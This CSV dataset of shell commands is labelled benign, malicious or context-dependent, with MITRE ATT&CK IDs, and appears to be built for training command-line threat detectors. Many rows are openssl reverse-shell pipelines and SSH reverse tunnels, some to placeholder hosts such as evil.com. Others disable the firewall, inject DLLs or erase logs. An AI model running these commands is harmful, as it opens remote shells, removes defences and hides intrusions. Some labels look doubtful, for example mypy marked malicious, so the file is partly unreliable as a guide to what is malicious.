command,label,original_label,mitre_id
"ugrep [-t |--file-type=]cpp ""search_pattern""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
glib-compile-resources --generate-dependencies file.gresource.xml,Benign,Benign,Benign
"find -type f -exec grep -l ""texthere"" {} +",Benign,Benign,Benign
find . -iname *.mov,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
rpi-imager --cli --sha256 expected_hash path/to/image.zip /dev/sdX,Benign,Benign,Benign
shiori serve --port 8181,Benign,Benign,Benign
ssh -R 8080:localhost:80 admin@10.20.30.40,Context_Dependent,Synthetic,Synthetic
sha512sum [-c|--check] --quiet path/to/file.sha512,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
dcg --directory path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
"find . -name ""*.txt"" -printf ""%M %f \t %s bytes \t%y\n""",Benign,Benign,Benign
cat files.txt | xargs scp user@remote:,Benign,Benign,Benign
ssh -R 4444:localhost:443 user@10.20.30.40,Context_Dependent,Synthetic,Synthetic
"Add-MailboxPermission -Identity ""$delegate_target"" -User ""$operator_mailbox"" -AccessRights FullAccess -InheritanceType All",Malicious,Malicious,T1098
wacaw filename,Benign,Benign,Benign
"mavinject.exe $process_id /INJECTRUNNING ""$dll_payload""",Malicious,Malicious,T1218
terminal-notifier -group tldr-info -title TLDR -message 'TLDR rocks',Benign,Benign,Benign
find ./ -name *.ogv -exec bash -c 'myfile {}' \;,Benign,Benign,Benign
ssh -R 4444:localhost:5432 backup@172.16.5.20,Context_Dependent,Synthetic,Synthetic
"find asia emea -type f -name ""*gz""",Benign,Benign,Benign
rc.common,Malicious,Malicious,T1037
ern create-container --miniapps /path/to/miniapp_directory --platform ios|android,Benign,Benign,Benign
detox [-n|--dry-run] -r path/to/directory,Benign,Benign,Benign
pammixinterlace path/to/image.ppm > path/to/output.ppm,Benign,Benign,Benign
farge --rgb --stdout,Benign,Benign,Benign
aurpublish [-h|--help],Benign,Benign,Benign
bssh --vnc,Benign,Benign,Benign
wajig sizes,Benign,Benign,Benign
wait4x tcp localhost:3306 -- path/to/script.sh,Benign,Benign,Benign
gitea admin --help,Benign,Benign,Benign
ssh -R 4444:localhost:445 user@10.0.0.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:110,Malicious,Synthetic,Synthetic
httping -h host -p port,Benign,Benign,Benign
hlint path/to/file --default > .hlint.yaml,Benign,Benign,Benign
dash path/to/script.sh,Benign,Benign,Benign
"Set-Service -Name service_name -Description ""description""",Benign,Benign,Benign
ProxyCommand,Malicious,Malicious,T1202
xbps-query [-l|--list-pkgs],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
tail -n 100 file1 | bar | wc -l,Benign,Benign,Benign
who am i --ips|awk '{print $5}' #ubuntu 14,Context_Dependent,Benign,Benign
"taskName = ""OpenCalcTask""",Malicious,Malicious,T1137
openssl s_client -quiet -connect 172.16.5.20:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")",Malicious,Malicious,T1218
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
cat path/to/input_file | col [-x|--spaces] > output_file,Benign,Benign,Benign
ssh -R 4444:localhost:8888 backup@10.0.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:995 operator@10.0.0.25,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:4444 backup@staging.lab,Context_Dependent,Synthetic,Synthetic
systemctl service-log-level service_name,Benign,Benign,Benign
kexec [-l|--load] path/to/kernel --initrd=path/to/initrd --command-line=arguments,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
git show-ref [-s|--hash] | git commit-graph write --stdin-commits,Benign,Benign,Benign
pulumi state edit --stack stack_name,Benign,Benign,Benign
"sudo mount -i -o remount,suid /home/evgeny",Benign,Benign,Benign
stolonctl --cluster-name cluster_name --store-backend store_backend --store-endpoints store_endpoints clusterdata,Benign,Benign,Benign
speaker-test [-t|--test] wav [-w|--wavfile] path/to/file.wav,Benign,Benign,Benign
resume init,Benign,Benign,Benign
ssh -R 4444:localhost:22 support@evil.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:6379,Malicious,Synthetic,Synthetic
find /data1/realtime -mmin -60 -type d,Benign,Benign,Benign
"find . -name ""*.java"" -exec grep -i -n TODO {} \;",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
testparm,Benign,Benign,Benign
find . -type f -not -path '*/\.*',Benign,Benign,Benign
calcurse-caldav --init=keep-local,Benign,Benign,Benign
ssh -R 8080:localhost:143 root@192.168.0.50,Context_Dependent,Synthetic,Synthetic
find ~ -name 'arrow*.xbm',Benign,Benign,Benign
pnmremap [-ma|-mapfile] path/to/palette_file.ppm [-m|-missingcolor] color path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
aws logs create-log-group --log-group-name $cloudwatch_log_group_name --region $region --output json,Malicious,Malicious,T1562
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:3389 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
alias mkdir=¨mkdir -p¨,Benign,Benign,Benign
sudo vgcreate volume_group /dev/sdXY,Benign,Benign,Benign
fastd [-c|--config] path/to/fastd.conf,Benign,Benign,Benign
"dcode -rev ""hello world""",Benign,Benign,Benign
git help [-c|--config],Benign,Benign,Benign
java_home --datamodel Applets|WebStart|BundledApp|JNI|CommandLine,Benign,Benign,Benign
"su - joe -c ""/path/to/my_daemon > /some/output/file"" &",Benign,Benign,Benign
find /home/ -name monfichier,Context_Dependent,Benign,Benign
plenv local version,Benign,Benign,Benign
tasklist.exe | findstr /i virus,Context_Dependent,Malicious,T1518
sshuttle --dns [-r|--remote] username@sshserver 0.0.0.0/0,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:445,Malicious,Synthetic,Synthetic
gcloud container clusters describe cluster_name,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
lynx -cookie_file=path/to/file example.com,Benign,Benign,Benign
ls -lah /usr/local/bin,Benign,Synthetic,Synthetic
RegisterModule,Malicious,Malicious,T1505
mytop [-u|-user] user [-p|-password] password --noidle,Benign,Benign,Benign
"pmap --range low,high",Benign,Benign,Benign
ssh -L 8080:localhost:9001 support@files.company.local,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
prstat -s rss,Benign,Benign,Benign
find /path/to/directory/* -maxdepth 0 -type d -exec basename -a {} +,Benign,Benign,Benign
ssh -R 8080:localhost:80 deploy@malware.site,Context_Dependent,Synthetic,Synthetic
vacuumdb --jobs number_of_jobs database_name,Benign,Benign,Benign
find /usr/tom | egrep '*.pl| *.pm',Benign,Benign,Benign
fin project stop,Benign,Benign,Benign
cargo binstall package@version,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
ibmcloud config --color false,Benign,Benign,Benign
hunspell -d en_US path/to/file,Benign,Benign,Benign
conda activate environment_name,Benign,Benign,Benign
vainfo --display wayland|x11|drm|...,Benign,Benign,Benign
docker logs my-container,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:8443 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
find / -user roger -print,Context_Dependent,Benign,Benign
gron path/to/file|url,Benign,Benign,Benign
emulator -avd name -sdcard path/to/sdcard.img,Benign,Benign,Benign
Remove-Item (Get-PSReadlineOption).HistorySavePath,Malicious,Malicious,T1070
"arduino --install-boards ""arduino:sam""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
zdb,Benign,Benign,Benign
sudo machinectl shell machine_name,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:993,Malicious,Synthetic,Synthetic
"find . -not \( -name .svn -prune -o -name .git -prune \) -type f -print0 | xargs -0 sed -i '' -E ""s/[[:space:]]*$//""",Benign,Benign,Benign
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f",Malicious,Malicious,T1562
openssl s_client -quiet -connect 172.20.10.8:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:3306 postgres@192.168.0.5,Context_Dependent,Synthetic,Synthetic
"ps -o uid,pid,cmd|awk '{if($1==""username"" && $3==""your_command"") print $2}'|xargs kill -15",Context_Dependent,Benign,Benign
ssh -R 8080:localhost:80 root@10.0.0.5,Context_Dependent,Synthetic,Synthetic
mysql_secure_installation,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
yaourt -S package,Benign,Benign,Benign
opam help,Benign,Benign,Benign
ssh -R 4444:localhost:22 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
circup show partial_name,Benign,Benign,Benign
7z x path/to/archive.7z,Benign,Benign,Benign
sfill -I /path/to/mounted_disk_directory,Benign,Benign,Benign
find . -mtime +30 -a -mtime -7 -print0,Benign,Benign,Benign
ssh -R 4444:localhost:22 deploy@192.168.1.10,Context_Dependent,Synthetic,Synthetic
radare2 -i path/to/script.r2 path/to/binary,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
minifab install [-n|--chaincode-name] chaincode_name,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
nmcli [c|connection] [a|add] ifname interface_name type ethernet ip6 2001:db8::2/64 gw6 2001:db8::1 ipv6.dns 2001:db8::1 ipv4.method ignore,Benign,Benign,Benign
"surfraw elvi_name ""search_terms""",Benign,Benign,Benign
hashid [-o|--outfile] path/to/output.txt hash,Benign,Benign,Benign
gh issue view issue_number [-w|--web],Benign,Benign,Benign
ssh -R 4444:localhost:22 user@172.16.0.25,Context_Dependent,Synthetic,Synthetic
aiac get mongo query that aggregates all documents by created date,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:80 deploy@192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
lspci,Benign,Synthetic,Synthetic
ssh -L 8080:localhost:8080 admin@172.16.5.20,Context_Dependent,Synthetic,Synthetic
sudo f3fix --boot /dev/device_name,Benign,Benign,Benign
ssh -R 8080:localhost:9090 admin@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
aws sns create-topic --name name,Benign,Benign,Benign
ssh -R 4444:localhost:9090 admin@192.168.0.50,Context_Dependent,Synthetic,Synthetic
"find ./ -name ""*TextForRename*""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:5432,Malicious,Synthetic,Synthetic
copyq < path/to/file.txt copy,Benign,Benign,Benign
autoflake --remove-unused-variables --in-place --recursive path/to/directory,Benign,Benign,Benign
"Get-NodeVersions -Filter "">=20.0.0 <21.0.0"" | Remove-NodeVersion",Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3306,Malicious,Synthetic,Synthetic
swaybg [-i|--image] path/to/image [-m|--mode] stretch|fit|fill|center|tile|solid_color,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
cp /home/user/config.yaml /home/user/config.yaml.bak,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:8080 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
w | awk '{print $1}',Context_Dependent,Benign,Benign
nmcli [n|networking] [c|connectivity],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:8081,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:53 support@10.0.0.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
plantuml -config config.cfg diagram.puml,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
retry command,Benign,Benign,Benign
generaldomaininfo -noninteractive -consoleoutput,Context_Dependent,Malicious,T1087
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
tar -cvzf $output_file $input_file_folder,Malicious,Malicious,T1560
ssh -R 4444:localhost:22 support@192.168.0.5,Context_Dependent,Synthetic,Synthetic
mitmweb,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:445 admin@update.bad,Context_Dependent,Synthetic,Synthetic
rfetch -a,Benign,Benign,Benign
mypy /path/to/input-file --junit-xml /path/to/output-file,Malicious,Malicious,T1222
yadm decrypt,Benign,Benign,Benign
sudo log erase --all,Malicious,Malicious,T1070
", [-s|--shell] command",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
"middleman init ""project_name""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9002,Malicious,Synthetic,Synthetic
sudo rm -rf /usr/local/bin/npm /usr/local/share/man/man1/node* /usr/local/lib/dtrace/node.d ~/.npm ~/.node-gyp /opt/local/bin/node opt/local/include/node /opt/local/lib/node_modules,Benign,Benign,Benign
zstd path/to/file,Benign,Benign,Benign
crystal help,Benign,Benign,Benign
notmuch setup,Benign,Benign,Benign
spa-resample path/to/input.wav path/to/output.wav,Benign,Benign,Benign
pio --version,Benign,Benign,Benign
ssh -R 8080:localhost:1433 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
PATH %PATH%;path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:9002,Malicious,Synthetic,Synthetic
bpytop,Benign,Benign,Benign
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force,Context_Dependent,Malicious,T1217
"find . -name ""*.txt"" -printf ""%f\n"" > /tmp/a",Benign,Benign,Benign
ssh -R 8080:localhost:8443 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
"varnishlog -q 'ReqHeader eq ""Host: example.com""'",Benign,Benign,Benign
conda deactivate,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
net time \\ip/hostname,Malicious,Malicious,T1124
